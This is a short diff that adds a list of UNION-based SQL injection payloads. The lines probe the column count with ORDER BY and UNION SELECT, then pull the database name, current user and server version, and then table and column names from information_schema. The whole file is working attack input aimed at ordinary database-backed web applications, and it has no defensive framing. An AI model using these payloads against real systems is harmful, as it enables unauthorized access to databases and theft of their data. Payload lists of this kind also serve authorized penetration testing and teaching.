@@ -1,0 +1,5 @@
+order by 5
+union select 1,2,3,4,5
+union select null, null, database(), user(), @@version
+union select null, table_name, column_name, table_schema, null from information_schema.columns
+union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database()
